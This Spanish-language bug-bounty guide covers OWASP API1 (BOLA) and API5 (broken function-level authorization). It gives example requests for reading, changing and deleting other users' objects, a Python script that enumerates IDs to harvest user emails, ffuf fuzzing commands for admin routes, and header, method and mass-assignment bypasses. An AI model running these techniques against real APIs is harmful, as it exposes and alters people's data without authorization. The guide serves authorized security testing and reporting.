# API1 & API5 — BOLA y Broken Function Level Authorization

### API1 — Broken Object Level Authorization (BOLA)

#### ¿Qué es?

BOLA (también llamado IDOR en contexto web) es la vulnerabilidad más frecuente en APIs. Ocurre cuando la API no verifica que el usuario autenticado tiene permiso para acceder al **objeto específico** que está solicitando. Cualquier usuario puede acceder a los datos de cualquier otro simplemente cambiando el ID en la petición.

```http
-- Usuario A pide sus datos --
GET /api/v1/accounts/1042/transactions
Authorization: Bearer TOKEN_USUARIO_A
→ 200 OK {"transactions": [...]}

-- Usuario A pide los datos de Usuario B --
GET /api/v1/accounts/1043/transactions
Authorization: Bearer TOKEN_USUARIO_A
→ 200 OK {"transactions": [...]}  ← BOLA: debería ser 403
```

#### Por qué las APIs son más vulnerables a BOLA que las webs

```
En una web tradicional:
→ El servidor sabe quién eres por la sesión
→ La query SQL filtra por session_user_id automáticamente

En una API REST:
→ El cliente envía explícitamente el ID del objeto que quiere
→ El servidor a veces no verifica que ese ID pertenece al token del request
→ El diseño "RESTful" (recurso + ID en la URL) facilita enumerar objetos
```

#### Tipos de identificadores en APIs

```bash
# Numérico secuencial (el más fácil de explotar)
GET /api/users/1042
GET /api/orders/9988
GET /api/invoices/50431

# UUID (parece seguro, pero puede filtrarse en otras respuestas)
GET /api/documents/550e8400-e29b-41d4-a716-446655440000

# Hash predecible (MD5/SHA1 del email o ID)
GET /api/profile/d8578edf8458ce06fbc5bb76a58c5ca4

# Referencia indirecta (índice que mapea a objeto real)
GET /api/files?ref=3

# Nombre de recurso
GET /api/users/juan.garcia/settings
```

#### Detección — Dónde buscar en la API

```
Endpoints típicamente vulnerables a BOLA:
→ GET  /api/users/{id}
→ GET  /api/orders/{id}
→ GET  /api/invoices/{id}/pdf
→ GET  /api/messages/{thread_id}
→ PUT  /api/users/{id}/settings
→ DELETE /api/posts/{id}
→ GET  /api/admin/reports/{id}

En el body de peticiones POST/PUT:
{"user_id": 1042, "action": "reset"}
{"account_id": "ACC001", "amount": 500}
{"recipient_id": 456}

En cabeceras custom:
X-User-Id: 1042
X-Account: ACC001
```

#### Técnica — Prueba manual con Burp

```http
-- Paso 1: Con tu cuenta, obtener tu propio ID --
GET /api/users/me HTTP/1.1
Authorization: Bearer TOKEN_A
→ {"id": 1042, "email": "attacker@test.com"}

-- Paso 2: Acceder al objeto de otro usuario --
GET /api/users/1043 HTTP/1.1
Authorization: Bearer TOKEN_A
→ Si devuelve datos de 1043 = BOLA confirmado

-- Paso 3: Iterar para confirmar alcance --
GET /api/users/1 HTTP/1.1   → ¿Admin?
GET /api/users/2 HTTP/1.1
GET /api/users/3 HTTP/1.1
```

#### BOLA en distintos métodos HTTP

```http
-- BOLA de lectura (GET) --
GET /api/users/1043/profile    → datos del usuario 1043

-- BOLA de escritura (PUT/PATCH) --
PUT /api/users/1043/email
{"email": "attacker@evil.com"}
→ Si modifica el email de 1043 = BOLA crítico

-- BOLA de borrado (DELETE) --
DELETE /api/posts/9988
→ Si borra el post 9988 de otro usuario = BOLA

-- BOLA en parámetros del body --
POST /api/messages/send
{"to": 1043, "message": "hola"}
→ Si permite enviar como cualquier usuario: añadir "from": 1 (admin)
```

#### Script de explotación masiva

```python
import requests

API = "https://target.com/api/v1"
TOKEN = "Bearer eyJhbGciOiJIUzI1NiJ9..."
HEADERS = {"Authorization": TOKEN, "Content-Type": "application/json"}

def test_bola(endpoint_template, id_range):
    for i in id_range:
        url = f"{API}{endpoint_template.format(id=i)}"
        r = requests.get(url, headers=HEADERS)
        if r.status_code == 200 and len(r.content) > 50:
            data = r.json()
            print(f"[BOLA] ID {i}: {data.get('email', data.get('name', 'datos'))}")

# Probar IDs 1000-1100
test_bola("/users/{id}", range(1000, 1100))
test_bola("/orders/{id}", range(5000, 5050))
test_bola("/invoices/{id}/download", range(1, 50))
```

#### BOLA con Burp Suite + Autorize

```
1. Instalar Autorize: BApp Store → Autorize
2. Autenticarse como usuario B (víctima) → copiar su cookie/token
3. En Autorize → pegar el token de B en "Intercept requests from Repeater"
4. Autenticarse como usuario A (atacante) y navegar
5. Autorize repite automáticamente cada petición con el token de B
6. Columna "Authz: Bypassed!" → BOLA confirmado
```

### API5 — Broken Function Level Authorization (BFLA)

#### ¿Qué es?

BFLA ocurre cuando un usuario de bajo privilegio puede acceder a **funciones** que deberían estar restringidas a roles superiores (admin, moderador...). No es acceder a un objeto de otro usuario (BOLA) sino acceder a **capacidades** que no le corresponden.

```http
-- Usuario normal intenta función de admin --
DELETE /api/v1/admin/users/1043
Authorization: Bearer TOKEN_USUARIO_NORMAL
→ Debería dar 403, pero a veces da 200
```

#### Diferencia BOLA vs BFLA

```
BOLA (API1): misma función, distinto objeto
→ "No deberías ver ESE objeto, solo el tuyo"
→ GET /api/orders/1043 → accedes a pedido de otro

BFLA (API5): distinta función, más privilegiada
→ "No deberías poder hacer ESA acción"
→ DELETE /api/admin/users/1043 → borras usuario como no-admin
```

#### Dónde buscar endpoints de admin

```bash
# Fuzzing de rutas de admin en la API
ffuf -u https://target.com/api/FUZZ -w /usr/share/seclists/Discovery/Web-Content/api/api-seen-in-wild.txt
ffuf -u https://target.com/api/v1/FUZZ -w admin_endpoints.txt

# Rutas de admin más comunes en APIs
/api/admin/
/api/v1/admin/
/api/management/
/api/internal/
/api/staff/
/api/moderator/
/api/superuser/
/api/debug/
/api/config/
/api/system/

# Endpoints específicos de admin a probar
/api/admin/users                    # Listar todos los usuarios
/api/admin/users/{id}               # Ver/editar cualquier usuario
/api/admin/users/{id}/ban           # Banear usuario
/api/admin/users/{id}/role          # Cambiar rol
/api/admin/reports                  # Reportes del sistema
/api/admin/logs                     # Logs de acceso
/api/admin/config                   # Configuración global
/api/admin/stats                    # Estadísticas
/api/admin/emails                   # Enviar emails masivos
```

#### Técnicas de bypass BFLA

```http
-- Probar directamente con token de usuario normal --
DELETE /api/admin/users/1043
Authorization: Bearer TOKEN_USUARIO_NORMAL
→ A veces el servidor comprueba autenticación pero no autorización

-- Cambiar método HTTP --
GET  /api/admin/users → 403
POST /api/admin/users → 200?  ← método diferente puede pasar el control

-- Versión antigua de la API --
DELETE /api/v2/admin/users/1043 → 403
DELETE /api/v1/admin/users/1043 → 200?  ← v1 sin controles

-- Bypass con headers de proxy --
X-Original-URL: /api/admin/users
X-Rewrite-URL: /api/admin/users
X-Forwarded-For: 127.0.0.1

-- Bypass de content-type --
Content-Type: application/json   → 403
Content-Type: text/plain         → 200?

-- Añadir parámetro de rol en el body --
POST /api/users/settings
{"theme": "dark", "role": "admin"}       ← mass assignment
{"theme": "dark", "is_admin": true}
```

#### Diferencia práctica en el testing

```
Para BOLA:
→ Necesitas 2 cuentas del mismo rol
→ Intercambias los IDs de los objetos entre ellas

Para BFLA:
→ Necesitas 2 cuentas de distinto rol (user y admin)
→ Con Burp, captura peticiones del admin y repítelas con el token del user normal
→ Autorize hace esto automáticamente si configuras los dos tokens
```

### PoC

```
BOLA — Prueba de concepto:
1. Autenticarse como user_A (id: 1042)
2. Petición: GET /api/v1/users/1043/profile
   Authorization: Bearer TOKEN_USER_A
3. Respuesta: 200 OK con datos de user_B (id: 1043)
   {"id": 1043, "email": "victim@empresa.com", "phone": "..."}

Impacto: Cualquier usuario autenticado puede acceder al perfil completo
de cualquier otro usuario de la plataforma. Afecta a todos los usuarios.

BFLA — Prueba de concepto:
1. Autenticarse como user_normal (rol: user)
2. Petición: DELETE /api/v1/admin/users/1043
   Authorization: Bearer TOKEN_USER_NORMAL
3. Respuesta: 200 OK → usuario 1043 eliminado
Impacto: Un usuario sin privilegios puede eliminar cualquier cuenta.
```

> BOLA es la vulnerabilidad #1 en APIs según OWASP. En bug bounty, un BOLA que expone datos de otros usuarios es casi siempre High o Critical. Probar siempre primero.

> La extensión Autorize de Burp automatiza completamente la prueba de BOLA y BFLA: configura el token de un usuario de bajos privilegios y repite automáticamente todas las peticiones del usuario de altos privilegios, mostrando cuáles son accesibles sin autorización.

> La diferencia entre BOLA y BFLA es sutil pero importante para el reporte: BOLA es un fallo en el control a nivel de objeto (dato específico), BFLA es un fallo en el control a nivel de función (capacidad/acción). Afectan a distintas capas de la arquitectura.
